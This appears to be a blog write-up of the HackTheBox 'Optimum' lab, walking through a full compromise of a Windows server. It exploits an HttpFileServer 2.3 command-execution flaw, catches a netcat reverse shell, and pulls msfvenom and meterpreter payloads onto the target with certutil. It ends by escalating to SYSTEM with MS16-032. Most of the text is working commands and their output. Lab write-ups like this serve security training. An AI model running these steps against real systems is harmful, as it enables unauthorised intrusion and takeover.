---
layout: page
title: Optimum
description: Optimum from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/optimum/logo.png" title="HTB Optimum Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Optimum">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
A reliable source tells me that this is the optimum box to do right now.  So here we go.

Run nmap and get a list of the ports.  Notice that there is HttpFileServer, version 2.3, running on port 80.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.8  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 16:09 AEDT
Nmap scan report for 10.10.10.8
Host is up (0.016s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   18.56 ms 10.10.16.1
2   18.72 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.23 seconds
```
{% endraw %}

<br />
Run nmap against all the ports to try and find any unsual services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.8    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 16:09 AEDT
Nmap scan report for 10.10.10.8
Host is up (0.022s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 115.85 seconds
```
{% endraw %}

<br />
Run the searchsploit for the HttpFileServer 2.3 to find any potential exploits.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ searchsploit HttpFileServer                  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                                               | windows/webapps/49125.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
{% endraw %}

<br />
Copy the exploit into the local working folder.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ cp `locate 49125.py` .
```
{% endraw %}

<br />
Search the exploit-db for the same http file server.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/optimum/exploitdb.png" title="Look up Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a>

<br />
Download ye old exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ wget https://www.exploit-db.com/raw/39161 -O exploit.py                                           
--2025-02-02 16:19:17--  https://www.exploit-db.com/raw/39161
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2515 (2.5K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   2.46K  --.-KB/s    in 0s      

2025-02-02 16:19:19 (73.8 MB/s) - ‘exploit.py’ saved [2515/2515]
```
{% endraw %}

<br />
Update the exploit ip_addr and local_port variables to the attack machine LHOST and LPORT.

{% raw %}
```sh
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

<snip>

    ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number

<snip>
```
{% endraw %}

<br />
Transfer nc.exe into the local working folder and start a python webserver listening on port 80.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ cp `locate nc.exe` .  
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nc -nlvp 80                             
[sudo] password for kali: 
listening on [any] 80 ...
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nc -nlvp 443                                        
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Execute the listener.  I had to run it twice to get it to work.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ python2 exploit.py 10.10.10.8 80
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ python2 exploit.py 10.10.10.8 80
```
{% endraw %}

<br />
Check the listener and catch that sweet, sweet shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nc -nlvp 443                                        
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49187
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
C:\Users\kostas\Desktop>type user.txt
type user.txt
<redacted>

C:\Users\kostas\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.8
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```
{% endraw %}

<br >
Run the whoami and the whoami /priv to see who we are and what privileges that we have.

{% raw %}
```sh
C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas

C:\Users\kostas\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
{% endraw %}

<br />
Run systeminfo to get an understanding of what environment the we are in.  We know the version of Windows, architecture, and hotfixes applied.

{% raw %}
```sh
C:\Users\kostas\Desktop>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          14/2/2025, 8:07:23 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2645 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.425 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.888 MB
Virtual Memory: In Use:    615 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
{% endraw %}

<br />
Searching for that version of Windows we stumble across MS16-032 PowerShell script.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/optimum/exploitdb032.png" title="Look up Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/39719">https://www.exploit-db.com/exploits/39719</a>

<br />
Download the PowerShell script.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ wget https://www.exploit-db.com/raw/39719 -O MS16-032.ps1    
--2025-02-09 00:28:42--  https://www.exploit-db.com/raw/39719
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘MS16-032.ps1’

MS16-032.ps1                                                   [  <=>                                                                                                                                    ]  11.55K  56.0KB/s    in 0.2s    

2025-02-09 00:28:43 (56.0 KB/s) - ‘MS16-032.ps1’ saved [11829]
```
{% endraw %}

<br />
Transfer the exploit to the victim machine.

{% raw %}
```sh
C:\Users\kostas\Desktop>certutil.exe -urlcache -f http://10.10.16.12/MS16-032.ps1 MS16-032.ps1
certutil.exe -urlcache -f http://10.10.16.12/MS16-032.ps1 MS16-032.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Try the exploit multiple times and it would always hand the shell.  Control+c and reget the shell and repeat.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49243
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit "& "C:\Users\kostas\Desktop\MS16-032.ps1"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit "& "C:\Users\kostas\Desktop\MS16-032.ps1"
^C
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49247
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>powershell -exec bypass
powershell -exec bypass
Windows PowerShell 
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

^C
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49251
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>c:\windows\sysnative\windowspowershell\v1.0\powershell.exe
c:\windows\sysnative\windowspowershell\v1.0\powershell.exe
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop> Set-ExecutionPolicy -ExecutionPolicy unrestricted
```
{% endraw %}

<br />
Create an msfvenom using a powershell payload.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f exe -o psshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1887 bytes
Final size of exe file: 8192 bytes
Saved as: psshell.exe
```
{% endraw %}

<br />
Set up a brand-spanking-new listener to catch the new payload.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
```
{% endraw %}

<br />
Transfer to the victim machine.

{% raw %}
```sh
C:\Users\kostas\Desktop>certutil.exe -urlcache -f http://10.10.16.12/psshell.exe psshell.exe
certutil.exe -urlcache -f http://10.10.16.12/psshell.exe psshell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Execute the executable exploit.

{% raw %}
```sh
C:\Users\kostas\Desktop>.\psshell.exe
.\psshell.exe
```
{% endraw %}

<br />
Check the 4444 listener and catch the new shell and notice we are in PowerShell now.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49263
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
optimum\kostas
PS C:\Users\kostas\Desktop>
```
{% endraw %}

<br />
Try to importing the exploit module and Invoke the exploit.  Not that it appears to work but we are still the same user.

{% raw %}
```sh
PS C:\Users\kostas\Desktop> Import-Module C:\Users\kostas\Desktop\MS16-032.ps1
PS C:\Users\kostas\Desktop> Invoke-MS16-032
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1144

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1200
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

PS C:\Users\kostas\Desktop> whoami
optimum\kostas
```
{% endraw %}

<br />
Use msfvenom to generate a meterpreter payload.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f exe -o meter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: meter.exe
```
{% endraw %}

<br />
Set up an exploit/multi/handler to catch the third shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/optimum]
└─$ msfconsole -q                                                                               
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4444
```
{% endraw %}

<br />
Transfer the third payload to the victim machine.

{% raw %}
```sh
C:\Users\kostas\Desktop>certutil.exe -urlcache -f http://10.10.16.12/meter.exe meter.exe
certutil.exe -urlcache -f http://10.10.16.12/meter.exe meter.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Execute the third payload.

{% raw %}
```sh
C:\Users\kostas\Desktop>.\meter.exe
.\meter.exe
```
{% endraw %}

<br />
Check the multi/handler and catch our fancy meterpreter session.

{% raw %}
```sh
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4444 
[*] Sending stage (177734 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.16.12:4444 -> 10.10.10.8:49206) at 2025-02-08 23:41:49 +1100

meterpreter >
```
{% endraw %}

<br />
Background the session and run local exploit suggester.

{% raw %}
```sh
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 203 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.8 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 9   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 10  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 12  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 14  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 15  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 16  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 17  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 18  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 19  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 20  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 21  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 22  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 23  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 24  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable
 25  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 26  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 27  exploit/windows/local/ms14_058_track_popup_menu                No                       The target is not exploitable.
 28  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 29  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 30  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 32  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 33  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 39  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.
 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.

[*] Post module execution completed
```
{% endraw %}

<br />
Run the MS16-032 exploit like we were trying to do before.  Finally, got it to work.  Bingo!

{% raw %}
```sh
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\CzPvxQz.ps1...
[*] Compressing script contents...
[+] Compressed size: 3761
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2364

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $yG3 = [Ntdll]::NtImpersonateThread($kQ_i, $kQ_i, [ref]$n9W)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (n9W:VariablePath) [], Runtime 
   Exception
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $yG3 = [Advapi32]::DuplicateToken($zR5Qn, 2, [ref]$eSTz)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

l4VzL2YXtZ4WM0iAaKwmaKTZqLirKUFn
[+] Executed on target machine.
[*] Sending stage (177734 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.16.12:4444 -> 10.10.10.8:49207) at 2025-02-08 23:46:02 +1100
[+] Deleted C:\Users\kostas\AppData\Local\Temp\CzPvxQz.ps1

meterpreter > shell
Process 2664 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
C:\Users\kostas\Desktop>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
<redacted>

C:\Users\kostas\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.8
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
```
{% endraw %}

<br />
Hmmm.  We got the flag.  I might revisit later to get the manual exploit to work.  Not sure.  Either way, hope you enjoyed.